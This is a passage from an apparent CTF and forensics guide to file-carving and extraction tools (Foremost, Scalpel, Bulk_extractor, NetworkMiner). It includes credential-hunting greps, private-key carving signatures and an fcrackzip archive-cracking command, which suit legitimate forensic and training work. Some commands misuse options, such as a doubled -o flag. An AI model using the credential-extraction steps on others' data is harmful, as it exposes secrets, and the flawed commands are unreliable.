# Show progress information
foremost -v -i file.bin -o output/

# Very verbose (debugging)
foremost -V -i file.bin -o output/
```

**Quick Mode:**

```bash
# Stop after first header (faster)
foremost -q -i file.bin -o output/
```

**Write Audit File Only:**

```bash
# Don't write files, only generate audit
foremost -w -i file.bin -o output/
```

### Disk Image Analysis

**Physical Drive Carving:**

```bash
# Carve from physical device (requires root)
sudo foremost -i /dev/sdb -o recovered/

# Carve from disk image
foremost -i disk.dd -o recovered/
```

**Partition-Specific:**

```bash
# Calculate partition offset
fdisk -l disk.img

# Carve from offset (512-byte sectors)
foremost -o 2048 -i disk.img -o output/
```

### PCAP File Analysis

**Carve Files from Network Capture:**

```bash
# Extract files transferred over network
foremost -t all -i capture.pcap -o network_files/

# Common finds: images, documents, executables
```

[Inference] Foremost can identify file signatures in packet payloads, though protocol-aware tools like Wireshark or NetworkMiner may provide better results for protocol-specific extraction.

### Audit File Analysis

**Audit.txt Format:**

```
Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus
Audit File

Foremost started at Sun Oct 19 2025
Invocation: foremost -i file.bin -o output
Output directory: output
Configuration file: /etc/foremost.conf
------------------------------------------------------------------
File: file.bin
Start: Sun Oct 19 2025
Length: 10 MB (10485760 bytes)
 
Num      Name (bs=512)         Size      File Offset     Comment 
0:      00000100.jpg          15 KB        51200          
1:      00000200.png         120 KB       102400          
2:      00000500.pdf         500 KB       256000          

Finish: Sun Oct 19 2025

3 FILES EXTRACTED
```

**Parse Audit Programmatically:**

```bash
# Extract file offsets
grep -E "^[0-9]+:" output/audit.txt | awk '{print $1, $2, $4}'

# Count recovered files by type
for dir in output/*/; do
    echo "$(basename $dir): $(ls $dir 2>/dev/null | wc -l) files"
done
```

### CTF-Specific Techniques

**Hidden Data After File EOF:**

```bash
# Image with appended ZIP
foremost -t jpg,zip -i image.jpg -o carved/

# Check audit for multiple file types at same offset
```

**Fragmented File Recovery:**

```bash
# Reduce block size for better fragmentation handling
foremost -b 128 -t jpg -i fragmented.bin -o output/
```

**Custom Flag Format Signatures:**

```bash
# Create signature for flag format
cat > flag.conf << 'EOF'
txt  n  1000  flag{  }
txt  n  1000  FLAG{  }
txt  n  1000  CTF{   }
EOF

foremost -c flag.conf -i challenge.bin -o flags/
```

**Memory Dump Analysis:**

```bash
# Carve files from memory dump
foremost -t all -i memory.dmp -o mem_recovered/

# Common finds: browser history, cached images, documents
```

### Performance Considerations

**Large File Handling:**

```bash
# Use larger block size for speed
foremost -b 4096 -i large_disk.img -o output/

# Quick mode for initial survey
foremost -q -t jpg,pdf -i large_file.bin -o quick_check/
```

**Parallel Processing:**

```bash
#!/bin/bash
# Split large file and process in parallel
split -b 1G large.bin chunk_
for chunk in chunk_*; do
    foremost -i "$chunk" -o "output_$chunk/" &
done
wait
```

### Common Issues

**Issue 1: No Files Recovered**

```bash
# Verify file signatures
hexdump -C file.bin | head -20

# Try different config
foremost -c /etc/foremost.conf -v -i file.bin -o output/

# Check for encryption/compression
binwalk -E file.bin
```

**Issue 2: Corrupted Recovered Files**

```bash
# Reduce block size
foremost -b 64 -i file.bin -o output/

# Try Scalpel (more aggressive)
scalpel file.bin -o output/
```

**Issue 3: False Positives**

```bash
# Validate recovered files
file output/*/* | grep -v ": data$"

# Check file integrity
for img in output/jpg/*; do
    jpeginfo -c "$img" || echo "Corrupt: $img"
done
```

## Scalpel Carving

### Overview

Scalpel is a fast file carving tool designed to improve upon Foremost. It uses multi-threaded processing and more sophisticated carving algorithms. Developed for digital forensics investigations.

**Key Improvements over Foremost:**

- Multi-threaded operation
- Lower memory footprint
- Better handling of fragmented files
- More granular configuration

### Installation

```bash
# Debian/Ubuntu/Kali
apt-get install scalpel

# Verify installation
scalpel -V
```

### Configuration File

**Default Configuration:** `/etc/scalpel/scalpel.conf`

**Configuration Syntax:**

```
# extension  case_sensitive  max_size  header           footer         [header_offset]

# Common signatures (uncomment to enable):
jpg     y   200000000   \xff\xd8\xff\xe0    \xff\xd9
gif     y   5000000     \x47\x49\x46\x38    \x00\x3b
png     y   20000000    \x89\x50\x4e\x47    \x89\x50\x4e\x47\x0d\x0a\x1a\x0a
pdf     y   10000000    \x25\x50\x44\x46    \x25\x45\x4f\x46\x0a
zip     y   100000000   \x50\x4b\x03\x04    \x50\x4b\x05\x06
rar     y   100000000   \x52\x61\x72\x21    \xc4\x3d\x7b\x00\x40\x07\x00
```

**Enable Signatures:**

```bash
# Default config has most signatures commented out
# Copy and edit
cp /etc/scalpel/scalpel.conf ~/scalpel_custom.conf

# Uncomment desired file types
sed -i 's/^# jpg/jpg/' ~/scalpel_custom.conf
sed -i 's/^# png/png/' ~/scalpel_custom.conf
sed -i 's/^# pdf/pdf/' ~/scalpel_custom.conf
```

### Basic Usage

**Standard File Carving:**

```bash
# Carve with default config
scalpel file.bin -o output_dir/

# Use custom configuration
scalpel file.bin -c custom.conf -o output/

# Output must not exist (safety feature)
```

**Output Structure:**

```
output_dir/
├── audit.txt              # Detailed carving log
├── jpg-0-0                # Recovered files numbered sequentially
├── jpg-1-0
├── png-2-0
└── pdf-3-0
```

### Configuration Options

**Custom Signature Creation:**

```bash
cat > ctf.conf << 'EOF'
# CTF-specific signatures

# Flag formats
flag    n   1000        flag{                }
flag    n   1000        FLAG{                }
flag    n   1000        CTF{                 }

# Private keys
key     n   10000       -----BEGIN RSA       -----END RSA PRIVATE KEY-----
key     n   10000       -----BEGIN PRIVATE   -----END PRIVATE KEY-----

# SQLite databases
sqlite  n   100000000   \x53\x51\x4c\x69\x74\x65\x20\x66\x6f\x72\x6d\x61\x74\x20\x33\x00

# PCAP files
pcap    n   100000000   \xd4\xc3\xb2\xa1
pcapng  n   100000000   \x0a\x0d\x0d\x0a

# Office documents (OOXML)
docx    y   100000000   \x50\x4b\x03\x04    \x50\x4b\x05\x06
xlsx    y   100000000   \x50\x4b\x03\x04    \x50\x4b\x05\x06

# QR codes (PNG with specific structure)
qr      y   5000000     \x89\x50\x4e\x47    \x49\x45\x4e\x44\xae\x42\x60\x82
EOF
```

**Header Offset Parameter:**

```
# Syntax: header  footer  header_offset
# header_offset = distance between header start and file start

jpg  y  10000000  \xff\xd8\xff\xe0  \xff\xd9  0
# 0 = header is at file start (most common)
```

### Command-Line Options

**Preview Mode:**

```bash
# Show what would be carved without extracting
scalpel -p file.bin -c config.conf -o preview/

# Generates audit.txt without files
```

**Verbose Output:**

```bash
# Show detailed progress
scalpel -v file.bin -c config.conf -o output/

# More verbose
scalpel -V file.bin -c config.conf -o output/
```

**Quick Mode:**

```bash
# Stop at first occurrence of footer
scalpel -q file.bin -c config.conf -o output/

# Faster but may miss multi-file scenarios
```

**Block Alignment:**

```bash
# Specify block size (default: 1024 bytes)
scalpel -b 4096 file.bin -c config.conf -o output/

# Must be power of 2
```

**Organized Output:**

```bash
# Create subdirectories by file type
scalpel -O file.bin -c config.conf -o output/

# Output structure:
# output/jpg/, output/png/, output/pdf/
```

**Handle Embedded Data:**

```bash
# Don't skip embedded files
scalpel -e file.bin -c config.conf -o output/

# Useful for nested archives
```

### Disk and Memory Analysis

**Disk Image Carving:**

```bash
# Carve from full disk image
scalpel -c scalpel.conf disk.dd -o recovered/

# Progress monitoring
scalpel -v -c scalpel.conf large_disk.img -o output/
```

**Memory Dump Analysis:**

```bash
# Carve from RAM dump
scalpel -c memory.conf memory.dmp -o mem_carved/

# Useful configuration for memory:
cat > memory.conf << 'EOF'
# Memory-specific artifacts
txt     n   100000      http://
txt     n   100000      https://
txt     n   10000       password
txt     n   10000       username
key     n   10000       -----BEGIN
EOF
```

**Partition-Specific Carving:**

```bash
# Use dd to extract partition first
dd if=/dev/sdb1 of=partition.img bs=4M

# Then carve
scalpel partition.img -c config.conf -o part1_carved/
```

### Audit File Analysis

**Audit.txt Format:**

```
Scalpel version 2.0
Started at: Sun Oct 19 2025

Command line:
scalpel file.bin -c scalpel.conf -o output/

Output directory: output/
Configuration file: scalpel.conf

Opening target "/path/to/file.bin"
Image file pass 1/2.
file.bin: 100.0% |*****************************|  10.0 MB    00:00 ETA

Allocating work queues...
Work queues allocation complete. Building carve lists...
Carve lists built.  Workload:
jpg with header "\xff\xd8\xff\xe0" and footer "\xff\xd9": 3 files
png with header "\x89\x50\x4e\x47" and footer "\x89\x50\x4e\x47\x0d\x0a\x1a\x0a": 1 files
pdf with header "\x25\x50\x44\x46" and footer "\x25\x45\x4f\x46": 2 files

Carving files from image.
Image file pass 2/2.
file.bin: 100.0% |*****************************|  10.0 MB    00:00 ETA

Total carved files: 6
jpg: 3
png: 1
pdf: 2

Completed at: Sun Oct 19 2025
```

**Parse Carved Files:**

```bash
# List all carved files with details
grep "carved files:" output/audit.txt

# Extract file locations from audit
grep -A1000 "Carving" output/audit.txt | grep -E "^[a-z]+-[0-9]+"
```

### Advanced Carving Techniques

**Nested Archive Extraction:**

```bash
# First pass: extract archives
scalpel -c archives.conf data.bin -o pass1/

# Second pass: carve from extracted archives
for archive in pass1/*; do
    scalpel -c all.conf "$archive" -o "pass2_$(basename $archive)/"
done
```

**Incremental Carving:**

```bash
# Carve images first (faster)
scalpel -c images.conf file.bin -o images/

# Then documents
scalpel -c documents.conf file.bin -o docs/

# Finally everything else
scalpel -c comprehensive.conf file.bin -o everything/
```

**Footer-less File Types:**

```bash
# For files without clear footers (e.g., BMP)
cat > nofooter.conf << 'EOF'
# Use maximum size to delimit
bmp  y  5000000  \x42\x4d  
txt  n  100000   The flag is:
EOF
```

### CTF-Specific Scenarios

**Steganography Detection:**

```bash
# Carve from image files
scalpel -c stego.conf image.png -o carved/

# Configuration for common stego:
cat > stego.conf << 'EOF'
zip  y  10000000  \x50\x4b\x03\x04  \x50\x4b\x05\x06
rar  y  10000000  \x52\x61\x72\x21  \xc4\x3d\x7b\x00\x40\x07\x00
txt  n  100000    flag{              }
EOF
```

**Corrupted Archive Recovery:**

```bash
# Carve individual files from damaged archive
scalpel -c archive_internals.conf broken.zip -o recovered/

cat > archive_internals.conf << 'EOF'
# Common file types inside archives
jpg  y  10000000   \xff\xd8\xff  \xff\xd9
png  y  10000000   \x89\x50\x4e  \x49\x45\x4e\x44
pdf  y  10000000   \x25\x50\x44  \x25\x45\x4f\x46
txt  n  1000000    flag{         }
EOF
```

**Network Capture File Recovery:**

```bash
# Carve files from PCAP
scalpel -c network.conf capture.pcap -o net_files/

cat > network.conf << 'EOF'
jpg   y  20000000   \xff\xd8\xff\xe0  \xff\xd9
png   y  20000000   \x89\x50\x4e\x47  \x49\x45\x4e\x44
gif   y  20000000   \x47\x49\x46\x38  \x00\x3b
pdf   y  20000000   \x25\x50\x44\x46  \x25\x45\x4f\x46
zip   y  50000000   \x50\x4b\x03\x04  \x50\x4b\x05\x06
exe   y  50000000   \x4d\x5a          
EOF
```

### Performance Optimization

**Multi-threading:** [Unverified] Scalpel automatically uses multiple threads, but performance depends on I/O speed more than CPU.

```bash
# For RAID/SSD systems
scalpel -b 8192 file.bin -c config.conf -o output/

# For mechanical drives (reduce I/O contention)
scalpel -b 2048 file.bin -c config.conf -o output/
```

**Memory Efficiency:**

```bash
# Process large files in chunks
split -b 2G huge_file.bin chunk_
for chunk in chunk_*; do
    scalpel "$chunk" -c config.conf -o "output_$chunk/"
done

# Combine results
mkdir final_output
cp output_chunk_*/* final_output/
```

### Validation and Post-Processing

**Verify Carved Files:**

```bash
# Check file types
file output/* | grep -v ": data$"

# Validate image integrity
for img in output/jpg-*; do
    jpeginfo -c "$img" 2>&1 | grep -q "OK" || echo "Corrupt: $img"
done

# Check PDF integrity
for pdf in output/pdf-*; do
    pdfinfo "$pdf" >/dev/null 2>&1 || echo "Corrupt: $pdf"
done
```

**Remove Duplicates:**

```bash
# Find duplicate files by hash
cd output/
md5sum * | sort | uniq -w32 -D

# Remove duplicates (keep first occurrence)
fdupes -d .
```

## Bulk_extractor

### Overview

Bulk_extractor is a forensic tool that scans disk images, files, or directories and extracts useful information without parsing the file system. It identifies email addresses, URLs, credit cards, JSON structures, and other pattern-based data.

**Key Features:**

- No file system parsing required
- High-speed scanning
- Recursive decompression
- Context-aware extraction
- Histogram generation

### Installation

```bash
# Debian/Ubuntu/Kali
apt-get install bulk-extractor

# Verify installation
bulk_extractor -V
```

### Basic Usage

**Standard Extraction:**

```bash
# Extract from binary file
bulk_extractor -o output_dir file.bin

# Extract from disk image
bulk_extractor -o recovered disk.dd

# Extract from directory (recursive)
bulk_extractor -o results -R input_directory/
```

**Output Structure:**

```
output_dir/
├── alerts.txt              # Suspicious patterns
├── ccn.txt                 # Credit card numbers
├── ccn_track2.txt          # Credit card track data
├── domain.txt              # Domain names
├── email.txt               # Email addresses
├── ether.txt               # Ethernet MAC addresses
├── exif.txt                # EXIF data from images
├── gps.txt                 # GPS coordinates
├── ip.txt                  # IP addresses
├── json.txt                # JSON structures
├── kml.txt                 # KML geographic data
├── rfc822.txt              # Email messages
├── telephone.txt           # Phone numbers
├── url.txt                 # URLs
├── url_searches.txt        # Search queries
├── windirs.txt             # Windows directory paths
└── report.xml              # Summary report
```

### Scanners and Options

**List Available Scanners:**

```bash
# Show all available scanners
bulk_extractor -h | grep -A100 "Scanners"

# Common scanners:
# - email: Email addresses
# - gps: GPS coordinates
# - json: JSON structures
# - net: Network artifacts (IP, domain)
# - rar: RAR archives
# - zip: ZIP archives
# - base64: Base64-encoded data
# - httplogs: HTTP log entries
```

**Enable/Disable Scanners:**

```bash
# Disable specific scanner
bulk_extractor -o output -x rar file.bin

# Enable only specific scanners
bulk_extractor -o output -e email -e url -e ip file.bin

# Disable all except specific
bulk_extractor -o output -x all -e json -e base64 file.bin
```

**Recursive Archive Processing:**

```bash
# Automatically decompress and scan archives
bulk_extractor -o output -E rar -E zip file.bin

# Maximum recursion depth (default: 7)
bulk_extractor -o output -Z 10 file.bin
```

### Advanced Options

**Context Window:**

```bash
# Set context characters around findings (default: 16)
bulk_extractor -o output -C 64 file.bin

# More context = better understanding, larger output
```

**Page Size:**

```bash
# Set page size for processing (default: 16MB) 
bulk_extractor -o output -G 32M file.bin

# Larger pages = faster processing, more memory

# Smaller pages = better for fragmented data

````

**Margin Size:**
```bash
# Set overlap between pages (default: 4MB)
bulk_extractor -o output -g 8M file.bin

# Prevents missing data at page boundaries
````

**Sampling Mode:**

```bash
# Process only every Nth byte (faster, less thorough)
bulk_extractor -o output -s 2 file.bin

# Useful for quick surveys of large images
```

**Multi-threading:**

```bash
# Specify number of threads (default: auto-detect)
bulk_extractor -o output -j 8 file.bin

# More threads = faster on multi-core systems
```

**Offset Range:**

```bash
# Process only specific byte range
bulk_extractor -o output -o 1000000 -O 5000000 file.bin

# -o: start offset
# -O: stop offset
```

### Feature File Analysis

**Email Extraction:**

```bash
# Extract all email addresses
bulk_extractor -o output -e email file.bin

# View results
cat output/email.txt

# Format: offset<TAB>email<TAB>context
# Example:
# 1024    user@example.com    ...context text...
```

**Email Histogram:**

```bash
# View email frequency distribution
cat output/email_histogram.txt

# Format: count<TAB>email
# Example:
# 15    admin@example.com
# 8     user@test.com
```

**URL Extraction:**

```bash
# Extract URLs
bulk_extractor -o output -e url file.bin

# View URLs
cat output/url.txt

# Common CTF use: Find hidden endpoints, paths
grep -i flag output/url.txt
grep -i admin output/url.txt
grep -i secret output/url.txt
```

**URL Histogram:**

```bash
# Most frequently accessed URLs
cat output/url_histogram.txt | head -20

# Search query extraction
cat output/url_searches.txt
```

**IP Address Extraction:**

```bash
# Extract IP addresses
cat output/ip.txt

# Histogram of most common IPs
cat output/ip_histogram.txt

# Filter private IPs
grep -vE "^[0-9]+ (10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)" output/ip_histogram.txt
```

**Domain Extraction:**

```bash
# Extract domain names
cat output/domain.txt

# Histogram
cat output/domain_histogram.txt | sort -rn | head -20

# Find suspicious domains
grep -vE "\.(com|org|net)$" output/domain.txt
```

### JSON and Structured Data

**JSON Extraction:**

```bash
# Extract JSON structures
bulk_extractor -o output -e json file.bin

# View JSON findings
cat output/json.txt

# Parse with jq
grep -o '{.*}' output/json.txt | jq '.'
```

**Base64 Decoding:**

```bash
# Enable base64 scanner
bulk_extractor -o output -e base64 file.bin

# View decoded base64
cat output/base64.txt

# Extract and decode manually
awk '{print $2}' output/base64.txt | while read b64; do
    echo "$b64" | base64 -d 2>/dev/null
done
```

### EXIF and GPS Data

**EXIF Extraction:**

```bash
# Extract EXIF metadata from images
bulk_extractor -o output -e exif file.bin

# View EXIF data
cat output/exif.txt

# Parse for specific fields
grep -i "GPS" output/exif.txt
grep -i "Camera" output/exif.txt
grep -i "DateTime" output/exif.txt
```

**GPS Coordinate Extraction:**

```bash
# Extract GPS coordinates
cat output/gps.txt

# Format: offset<TAB>lat,lon<TAB>context

# Generate KML for visualization
cat output/kml.txt > locations.kml
# Open in Google Earth or similar
```

### Email Message Extraction

**RFC822 Email Messages:**

```bash
# Extract complete email messages
bulk_extractor -o output -e rfc822 file.bin

# View emails
cat output/rfc822.txt

# Each entry contains full email headers and body
```

**Email Attachment Extraction:** [Inference] Bulk_extractor extracts base64-encoded attachments as separate entries in base64.txt

```bash
# Find MIME boundaries
grep "Content-Transfer-Encoding: base64" output/rfc822.txt -A 50

# Extract attachment data
# Manual extraction required - identify boundary markers
```

### Credit Card and PII Detection

**Credit Card Numbers:**

```bash
# Extract credit card numbers (Luhn algorithm validated)
cat output/ccn.txt

# Track 2 data (magnetic stripe)
cat output/ccn_track2.txt
```

[Unverified] Bulk_extractor validates credit card numbers using the Luhn checksum algorithm, reducing false positives.

**Telephone Numbers:**

```bash
# Extract phone numbers
cat output/telephone.txt

# Histogram
cat output/telephone_histogram.txt
```

**Social Security Numbers:** [Inference] SSN detection may be available through custom scanner configurations, but is not enabled by default for privacy reasons.

### Windows Forensics

**Windows Paths:**

```bash
# Extract Windows directory paths
cat output/windirs.txt

# Common findings:
# - C:\Users\username\...
# - Program Files locations
# - AppData paths
```

**Registry-like Data:**

```bash
# Windows-specific artifacts often in winpe.txt
cat output/winpe.txt 2>/dev/null || echo "No Windows PE data found"
```

### Alert Analysis

**Security Alerts:**

```bash
# View generated alerts
cat output/alerts.txt

# Common alerts:
# - Encrypted data detected
# - Suspicious patterns
# - Malformed structures
```

**Custom Alert Rules:** [Unverified] Alert generation rules may be customizable through bulk_extractor source code modification or configuration files, but this is not documented in standard usage.

### Report Generation

**XML Report:**

```bash
# Comprehensive XML report
cat output/report.xml

# Parse with xmllint
xmllint --format output/report.xml

# Extract statistics
xmllint --xpath "//bulk_extractor_report/configuration" output/report.xml
```

**Summary Statistics:**

```bash
# Generate custom summary
echo "=== Bulk Extractor Summary ==="
for file in output/*.txt; do
    count=$(wc -l < "$file")
    [ $count -gt 0 ] && echo "$(basename $file): $count entries"
done | sort -t: -k2 -rn
```

### CTF-Specific Techniques

**Flag Pattern Extraction:**

```bash
# Create custom regular expression scanner
# [Inference] Requires bulk_extractor compilation with custom scanner

# Alternative: grep through all output
grep -r "flag{" output/
grep -r "CTF{" output/
grep -r -E "[A-Za-z0-9+/]{20,}={0,2}" output/ | head -20  # Base64-like
```

**Hidden URL Discovery:**

```bash
# Extract URLs and check for hidden paths
cat output/url.txt | awk '{print $2}' | sort -u > urls_unique.txt

# Test for interesting paths
grep -iE "(admin|flag|secret|hidden|backup|config)" urls_unique.txt

# Extract URL parameters
grep "?" output/url.txt | awk -F'?' '{print $2}' | sort -u
```

**Memory Dump Analysis:**

```bash
# Scan memory dump for artifacts
bulk_extractor -o mem_output -e email -e url -e ip -e json memory.dmp

# Extract passwords from memory (careful - may be hashed)
grep -ai "password" mem_output/*.txt
```

**Archive Password Discovery:**

```bash
# Extract potential passwords from context
cat output/url.txt output/email.txt output/json.txt | \
grep -iE "(password|pass|pwd)" | awk '{print $3}' > potential_passwords.txt

# Attempt archive cracking
fcrackzip -D -p potential_passwords.txt archive.zip
```

**Steganography Analysis:**

```bash
# Scan image files for hidden data
bulk_extractor -o stego_output image.jpg

# Check for embedded archives
cat stego_output/zip.txt
cat stego_output/rar.txt

# Check for hidden URLs/emails
cat stego_output/url.txt
cat stego_output/email.txt
```

**Network Traffic Reconstruction:**

```bash
# Extract from PCAP file
bulk_extractor -o pcap_output capture.pcap

# Reconstruct conversations
cat pcap_output/url.txt | awk '{print $2}' | sort | uniq -c | sort -rn

# Extract HTTP headers
cat pcap_output/httplogs.txt

# Find credentials
cat pcap_output/email.txt pcap_output/url.txt | grep -iE "(user|pass|login)"
```

### Post-Processing and Analysis

**Combine Results:**

```bash
# Merge all feature files for comprehensive search
cat output/*.txt > combined_results.txt

# Search across all findings
grep -i "target_string" combined_results.txt
```

**Deduplicate Findings:**

```bash
# Remove duplicate emails
awk '{print $2}' output/email.txt | sort -u > unique_emails.txt

# Remove duplicate URLs
awk '{print $2}' output/url.txt | sort -u > unique_urls.txt
```

**Timeline Analysis:**

```bash
# Sort all findings by offset (approximates temporal order)
cat output/*.txt | sort -n -k1 > timeline.txt

# [Inference] Offset order may correlate with temporal sequence for sequential writes
```

**Statistical Analysis:**

```bash
# Top 10 most common domains
cat output/domain_histogram.txt | sort -rn | head -10

# Top 10 most common IPs
cat output/ip_histogram.txt | sort -rn | head -10

# Email address diversity
wc -l output/email.txt
wc -l output/email_histogram.txt
# (fewer unique = more focused communication)
```

### Scripting and Automation

**Batch Processing:**

```bash
#!/bin/bash
# Process multiple images
for img in *.dd *.bin *.img; do
    [ -f "$img" ] || continue
    echo "[*] Processing $img"
    bulk_extractor -o "output_$(basename $img)" "$img"
done
```

**Automated Analysis Script:**

```bash
#!/bin/bash
OUTPUT_DIR="$1"

echo "=== Bulk Extractor Analysis Report ==="
echo

echo "Emails found: $(wc -l < $OUTPUT_DIR/email.txt)"
echo "URLs found: $(wc -l < $OUTPUT_DIR/url.txt)"
echo "IPs found: $(wc -l < $OUTPUT_DIR/ip.txt)"
echo "Credit cards found: $(wc -l < $OUTPUT_DIR/ccn.txt)"
echo

echo "=== Top 5 Domains ==="
head -5 $OUTPUT_DIR/domain_histogram.txt
echo

echo "=== Alerts ==="
cat $OUTPUT_DIR/alerts.txt
echo

echo "=== Potential Flags ==="
grep -riE "(flag{|CTF{|FLAG{)" $OUTPUT_DIR/
```

**Python Integration:**

```python
#!/usr/bin/env python3
import subprocess
import os

def run_bulk_extractor(input_file, output_dir):
    """Run bulk_extractor on input file"""
    cmd = ['bulk_extractor', '-o', output_dir, input_file]
    subprocess.run(cmd, check=True)

def parse_feature_file(filepath):
    """Parse bulk_extractor feature file"""
    results = []
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            if line.startswith('#'):
                continue
            parts = line.strip().split('\t')
            if len(parts) >= 2:
                results.append({
                    'offset': parts[0],
                    'feature': parts[1],
                    'context': parts[2] if len(parts) > 2 else ''
                })
    return results

# Usage
run_bulk_extractor('challenge.bin', 'output')
emails = parse_feature_file('output/email.txt')
for email in emails:
    print(f"Found: {email['feature']} at offset {email['offset']}")
```

### Performance Optimization

**Fast Survey Mode:**

```bash
# Quick scan with sampling
bulk_extractor -o quick_output -s 4 -j 8 large_file.bin

# Review histogram files only
ls quick_output/*_histogram.txt
```

**Targeted Scanning:**

```bash
# Only scan for specific data types
bulk_extractor -o targeted -x all -e email -e url -e ip file.bin

# Significantly faster than full scan
```

**Resource Management:**

```bash
# Limit memory usage
bulk_extractor -o output -G 8M -g 2M file.bin

# Limit CPU usage (fewer threads)
bulk_extractor -o output -j 2 file.bin
```

### Common Issues and Solutions

**Issue 1: No Results Found**

```bash
# Increase context window
bulk_extractor -o output -C 128 file.bin

# Disable sampling
bulk_extractor -o output -s 1 file.bin

# Check if file is encrypted/compressed
file file.bin
binwalk -E file.bin
```

**Issue 2: Too Many False Positives**

```bash
# Review histograms instead of raw files
cat output/email_histogram.txt | awk '$1 > 5'  # Only emails appearing 5+ times

# Manual validation required
```

**Issue 3: Memory Exhaustion**

```bash
# Reduce page size
bulk_extractor -o output -G 4M file.bin

# Process file in chunks
split -b 1G large_file.bin chunk_
for chunk in chunk_*; do
    bulk_extractor -o "output_$chunk" "$chunk"
done
```

### Comparison with Other Tools

|Feature|Bulk_extractor|Foremost|Scalpel|Binwalk|
|---|---|---|---|---|
|Speed|Very Fast|Medium|Fast|Medium|
|File Carving|No|Yes|Yes|Yes|
|Pattern Extraction|Excellent|No|No|Limited|
|Archive Handling|Automatic|Manual|Manual|Excellent|
|Memory Usage|Low|Low|Low|Medium|
|Best For|Text/metadata|Files|Files|Firmware|

### Related Tools and Techniques

**PhotoRec** - Alternative file carving tool with GUI

```bash
apt-get install testdisk  # Includes photorec
photorec file.bin
```

**Volatility** - Memory forensics framework (complements bulk_extractor for memory dumps)

```bash
apt-get install volatility3
vol -f memory.dmp windows.info
```

**RegRipper** - Windows Registry analysis (use with bulk_extractor's registry findings)

**Strings with Context** - Alternative to bulk_extractor for quick text extraction

```bash
strings -t x file.bin | grep -i "flag"
```

---

## NetworkMiner File Extraction

NetworkMiner is a Network Forensic Analysis Tool (NFAT) that automatically extracts files, credentials, and artifacts from PCAP files without requiring packet-level inspection.

### Installation and Setup

```bash
# Install on Kali Linux
sudo apt update
sudo apt install networkminer

# Launch NetworkMiner
sudo networkminer

# Or use Mono for CLI version
mono NetworkMiner.exe
```

**NetworkMiner CLI (Linux):**

```bash
# Basic usage
sudo mono /usr/share/networkminer/NetworkMiner.exe

# Process PCAP file (requires GUI, but can access output directory)
# Files extracted to: ~/.local/share/NetworkMiner/
```

### NetworkMiner GUI Interface Navigation

**Main Tabs:**

- **Hosts**: Displays discovered hosts with OS detection, MAC addresses, open ports
- **Files**: Lists all extracted files with metadata (filename, size, source/destination)
- **Images**: Visual thumbnail view of extracted images
- **Messages**: Email messages, chat logs, SMS
- **Credentials**: Extracted usernames, passwords, authentication attempts
- **Sessions**: Network sessions and conversations
- **DNS**: DNS queries and responses
- **Parameters**: HTTP parameters, form data, cookies
- **Keywords**: Custom keyword search results
- **Anomalies**: Protocol anomalies and potential security issues

### File Extraction Process

**Step 1: Load PCAP File**

```
File → Open → Select PCAP file
```

NetworkMiner automatically begins parsing and extracting artifacts.

**Step 2: Navigate to Files Tab**

The Files tab displays:

- Filename
- File size
- Protocol (HTTP, FTP, TFTP, SMB, etc.)
- Source host
- Destination host
- Timestamp
- Reconstructed file path

**Step 3: Export Extracted Files**

Right-click file → "Open folder" to access extracted files

Default extraction path:

```bash
# Linux
~/.local/share/NetworkMiner/AssembledFiles/

# Windows
%APPDATA%\NetworkMiner\AssembledFiles\
```

### Protocol-Specific Extraction

**HTTP File Extraction:**

NetworkMiner automatically extracts:

- HTML pages
- JavaScript files
- CSS stylesheets
- Images (JPEG, PNG, GIF, BMP, ICO)
- Documents (PDF, DOCX, XLSX, PPTX)
- Archives (ZIP, RAR, 7Z, TAR, GZ)
- Executables (EXE, DLL, MSI)
- Media files (MP3, MP4, AVI, WAV)

**FTP File Extraction:**

Automatically reconstructs files transferred via:

- FTP data channel (port 21 control, dynamic data ports)
- FTPS (FTP over TLS)

**SMB/CIFS File Extraction:**

Extracts files from:

- SMB file shares (SMB1, SMB2, SMB3)
- Windows network file transfers
- NetBIOS file sharing

**TFTP File Extraction:**

Extracts files from:

- TFTP transfers (UDP port 69)
- Common in network device configuration transfers

**Email Extraction:**

Extracts from:

- SMTP (email messages and attachments)
- POP3 (downloaded emails)
- IMAP (email synchronization)

### Credential Extraction

NetworkMiner automatically extracts credentials from:

```bash
# Navigate to Credentials tab to view:
```

- HTTP Basic Authentication (Base64 decoded)
- FTP login attempts (USER/PASS commands)
- IMAP/POP3/SMTP authentication
- HTTP form-based logins (POST data)
- NTLM authentication attempts
- Kerberos tickets
- Cookie session tokens

**Credential Types Displayed:**

- Username
- Password (cleartext if available)
- Protocol
- Host
- Timestamp
- Success/Failure indication

### Images Tab Analysis

**Visual Reconnaissance:**

The Images tab provides thumbnail previews of all extracted images, useful for:

- Quick visual identification of content
- Finding screenshots or photos in traffic
- Identifying logos or watermarks
- Detecting steganography candidates

**Image Export:**

Right-click thumbnail → "Open file location" → Access full resolution image

### DNS Tab Analysis

**DNS Intelligence Gathering:**

- Queried domains with timestamps
- Resolved IP addresses
- DNS server information
- Query types (A, AAAA, MX, TXT, etc.)

Useful for:

- Building IOC lists
- Identifying C2 domains
- Detecting DNS tunneling
- Mapping infrastructure

### Parameters Tab Analysis

**HTTP Parameter Extraction:**

Displays all HTTP parameters including:

- GET query parameters
- POST form data
- Cookies
- URLs with parameters

**Use Cases:**

- Finding injection payloads (SQLi, XSS, CMDi)
- Extracting API keys from URLs
- Discovering session tokens
- Analyzing application behavior

### Session Tab Analysis

**Network Session Reconstruction:**

- TCP session listing
- UDP conversations
- Protocol identification
- Data volume per session

**Filtering Sessions:**

- Sort by protocol
- Filter by port
- Search by host
- Order by timestamp or data size

### Advanced NetworkMiner Features

**Keyword Search:**

```
Tools → Keyword Search
```

Define keywords to automatically flag in extracted data:

- "password"
- "flag{"
- "admin"
- "secret"
- "key"
- Custom regex patterns

**OS Fingerprinting:**

NetworkMiner performs passive OS detection based on:

- TTL values
- Window sizes
- TCP options
- HTTP User-Agent strings
- DHCP fingerprints
- MAC address OUI lookup

**Anomaly Detection:**

Automatically flags:

- Invalid checksums
- Malformed packets
- Protocol violations
- Unusual port usage
- Suspicious file transfers

### NetworkMiner Limitations

[Unverified: These limitations are based on common observations and may vary by version]

- **Encrypted Traffic**: Cannot extract from TLS/SSL without keys
- **Fragmented Protocols**: May miss files in heavily fragmented traffic
- **Large PCAPs**: Performance degrades with multi-gigabyte captures
- **Custom Protocols**: Limited support for proprietary protocols
- **Corrupted Files**: May not reconstruct heavily corrupted file transfers

### Command-Line Alternative: Chaosreader

```bash
# Install chaosreader
sudo apt install chaosreader

